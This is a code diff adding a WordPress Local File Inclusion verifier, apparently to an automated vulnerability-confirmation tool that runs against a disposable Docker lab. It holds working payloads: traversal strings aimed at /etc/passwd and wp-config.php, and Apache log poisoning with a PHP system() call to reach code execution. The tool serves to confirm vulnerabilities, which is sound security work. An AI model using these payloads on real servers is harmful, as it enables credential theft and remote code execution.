@@ -2757,6 +2757,209 @@ def verify_wordpress_path_traversal(
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
 
 
+def verify_wordpress_lfi(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, path_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    shortcode_name: Optional[str] = None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Verifica Local File Inclusion (LFI) en plugins de WordPress.
+
+    Dos niveles de gravedad probados en orden:
+    1. LFI de lectura: el parametro incluye /etc/passwd o wp-config.php y el
+       contenido aparece en la respuesta (patron 'root:x:0:0' o 'DB_HOST').
+    2. LFI-a-RCE via log poisoning: se envenena el log de acceso de Apache con
+       '<?php system("echo MARKER"); ?>' y luego se incluye ese log via el
+       parametro -- si el marcador aparece EJECUTADO (sin las etiquetas PHP
+       alrededor), es ejecucion remota de codigo real, no solo lectura."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
+    if not path_param:
+        res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
+        res.limitations.append(
+            "la verificacion de LFI necesita saber que parametro lleva la ruta; "
+            "afina 'parameters' en la hipotesis del LLM o pasalo a mano (path_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins,
+                              shortcode_name=shortcode_name)
+        if boot is None:
+            return res
+
+        m = (http_method or "GET").upper()
+
+        # ficheros objetivo: /etc/passwd (prueba clasica, siempre existe en Linux) y
+        # wp-config.php (credenciales de BD, muy relevante en contexto WordPress).
+        # Se prueban profundidades de traversal 0..12 con y sin URL-encoding del "../".
+        targets = [
+            # (ruta, patron_regex_en_respuesta)
+            ("/etc/passwd", re.compile(r"root:x:0:0|daemon:x:1:1|bin:x:2:")),
+            ("wp-config.php", re.compile(r"DB_HOST|DB_PASSWORD|DB_NAME|define\s*\(")),
+        ]
+        traversal_prefixes = [
+            "", "../", "../../", "../../../", "../../../../",
+            "../../../../../", "../../../../../../",
+            "../../../../../../../", "../../../../../../../../",
+            # variantes URL-encoded del "../"
+            "%2e%2e%2f", "%2e%2e%2f%2e%2e%2f", "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
+            # null-byte (entornos con PHP < 5.3.4)
+            "../../../etc/passwd\x00",
+            "....//....//....//etc/passwd",
+        ]
+
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user,
+            "login_bajo_privilegio_password": boot.sub_pass,
+            "path_param": path_param, "metodo": m, "endpoint": endpoint,
+        })
+
+        # ── nivel 1: LFI de lectura ──────────────────────────────────────
+        read_found = False
+        read_tried = []
+        for rel_path, pattern in targets:
+            if read_found:
+                break
+            for prefix in traversal_prefixes:
+                payload_val = prefix + rel_path.lstrip("/")
+                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+                payload[path_param] = payload_val
+                step(f"probando LFI de lectura: {path_param}={payload_val!r}...")
+                try:
+                    resp = boot.sub_sess.request(
+                        m, boot.base_url + endpoint, timeout=20,
+                        data=payload if m != "GET" else None,
+                        params=payload if m == "GET" else None)
+                except Exception as e:
+                    read_tried.append({"payload": payload_val, "error": str(e)})
+                    continue
+                text = resp.text or ""
+                match = bool(pattern.search(text))
+                entry = {"payload": payload_val, "status": resp.status_code, "patron_encontrado": match}
+                read_tried.append(entry)
+                if match:
+                    read_found = True
+                    res.evidence["lfi_lectura_payload"] = payload_val
+                    res.evidence["lfi_lectura_status"] = resp.status_code
+                    res.evidence["lfi_lectura_fragmento"] = text[:400]
+                    res.evidence["lfi_lectura_fichero"] = rel_path
+                    step(f"LFI DE LECTURA confirmado: {path_param}={payload_val!r} devolvio "
+                         f"contenido de '{rel_path}' (patron encontrado en la respuesta).")
+                    boot.capture(boot.sub_sess, endpoint + "?" + path_param + "=" + payload_val
+                                 if m == "GET" else endpoint,
+                                 f"LFI de lectura: '{rel_path}' incluido via {path_param}",
+                                 f"LFI read: '{rel_path}' included via {path_param}")
+                    break
+        res.evidence["lfi_lectura_intentos"] = read_tried
+
+        # ── nivel 2: LFI-a-RCE via envenenamiento del log de Apache ─────
+        # Solo se intenta si Docker esta disponible (el lab ya lo usa) y no ha
+        # expirado el budget. Se prueba independientemente del nivel 1 -- si
+        # solo la lectura fue confirmada el RCE puede seguir funcionando.
+        rce_found = False
+        rce_tried = []
+        if time.time() - t0 < budget_s - 90:
+            marker = f"binoracle_lfi_{_token()}"
+            poison_ua = f"<?php system('echo {marker}'); ?>"
+            step(f"envenenando log de Apache con PHP en User-Agent (marcador {marker!r})...")
+            try:
+                import requests as _requests
+                _requests.get(boot.base_url + "/", headers={"User-Agent": poison_ua}, timeout=10)
+                time.sleep(1)
+            except Exception:
+                pass
+
+            # rutas de log mas comunes en imagenes Docker oficiales de Apache/PHP
+            log_paths = [
+                "/var/log/apache2/access.log",
+                "/var/log/apache2/other_vhosts_access.log",
+                "/var/log/httpd/access_log",
+                "/proc/self/fd/2",   # stderr -- a veces contiene el log de errores de Apache
+                "/usr/local/apache2/logs/access_log",
+            ]
+            depths = (0, 4, 8)
+            log_payloads = []
+            for lp in log_paths:
+                rel = lp.lstrip("/")
+                for n in depths:
+                    log_payloads.append(("../" * n + rel) if n else lp)
+
+            for lp_val in log_payloads:
+                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+                payload[path_param] = lp_val
+                step(f"incluyendo log envenenado: {path_param}={lp_val!r}...")
+                try:
+                    resp = boot.sub_sess.request(
+                        m, boot.base_url + endpoint, timeout=20,
+                        data=payload if m != "GET" else None,
+                        params=payload if m == "GET" else None)
+                except Exception as e:
+                    rce_tried.append({"payload": lp_val, "error": str(e)})
+                    continue
+                text = resp.text or ""
+                # EJECUTADO = marcador presente SIN etiquetas PHP alrededor
+                executed = marker in text and "<?php" not in text
+                raw_reflected = marker in text and "<?php" in text
+                entry = {"payload": lp_val, "status": resp.status_code,
+                         "ejecutado": executed, "reflejado_crudo": raw_reflected}
+                rce_tried.append(entry)
+                if executed:
+                    rce_found = True
+                    res.evidence["lfi_rce_payload"] = lp_val
+                    res.evidence["lfi_rce_fragmento"] = text[:400]
+                    step(f"LFI-A-RCE confirmado: log {lp_val!r} incluido y el marcador "
+                         f"'{marker}' aparecio EJECUTADO (no como PHP crudo).")
+                    break
+            res.evidence["lfi_rce_intentos"] = rce_tried
+
+        # ── veredicto ────────────────────────────────────────────────────
+        if rce_found:
+            res.verified = True
+            res.ok = True
+            res.detail = (
+                f"LFI-A-RCE confirmado (log poisoning): el log de acceso de Apache fue "
+                f"envenenado con PHP y al incluirlo via {path_param}="
+                f"{res.evidence['lfi_rce_payload']!r} el codigo SE EJECUTO de verdad "
+                f"(el marcador aparecio sin etiquetas PHP) -- ejecucion remota de codigo "
+                f"a partir de un Local File Inclusion")
+        elif read_found:
+            res.verified = True
+            res.ok = True
+            res.detail = (
+                f"LFI DE LECTURA confirmado: "
+                f"{path_param}={res.evidence['lfi_lectura_payload']!r} incluyo el "
+                f"contenido de '{res.evidence['lfi_lectura_fichero']}' en la respuesta "
+                f"(patron encontrado) -- lectura de ficheros del servidor; "
+                f"RCE via log poisoning no se confirmo en este entorno")
+        else:
+            res.ok = True
+            res.detail = (
+                f"se probaron {len(read_tried)} payloads de lectura y {len(rce_tried)} "
+                f"rutas de log para LFI-a-RCE -- ninguno confirmo inclusion de fichero "
+                f"como codigo ni lectura de /etc/passwd o wp-config.php")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
 def verify_wordpress_command_injection(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, cmd_param_hint: str = "",
